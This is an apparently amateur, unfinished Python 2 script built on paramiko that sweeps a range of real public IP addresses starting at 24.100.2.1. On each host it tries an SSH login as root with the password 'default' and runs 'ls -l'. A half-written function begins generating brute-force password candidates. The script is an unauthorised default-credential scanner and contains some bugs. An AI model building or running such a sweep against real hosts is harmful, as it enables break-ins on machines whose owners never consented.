import paramiko

# build function to understand ip address
# buld function to iterate over ips
# build function to understand what networks not to scan
ip = "24.100.2.1"
#a,b,c,d = ip.split(".")
#print int(d) + 1
host = ip
plength = 8
password = []

def disemip(ip):
	a,b,c,d = ip.split(".")
	a = int(a)
	b = int(b)
	c = int(c)
	d = int(d)
	return a,b,c,d

def assemip(a,b,c,d):
	a = str(a)
	b = str(b)
	c = str(c)
	d = str(d)
	ip = str(a) + "." + str(b) + "." + str(c) + "." + d
	return ip

def pshift():
	for num in range(1,plength):
		for i in range(0,plength):
			password.append("a")
		print "password: ", password
		for inc in range(48,123):
			print chr(inc)
			#nletter = chr(letter) + 1
			#new = ord(nletter)
def trypass(host):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(host, username='root',password='default')
	stdin, stdout, stderr = ssh.exec_command("ls -l")
	output = stdout.read()
	print output
	return stdin, stdout, stderr

def ipshift(ip):
	a,b,c,d = disemip(ip)
	for last in range(d,254):
		ip = assemip(a,b,c,last)
		host = ip
		stdin, stdout, stderr = trypass(host)
		#last = last + 1
		print ip
	

ipshift(ip)
exit()

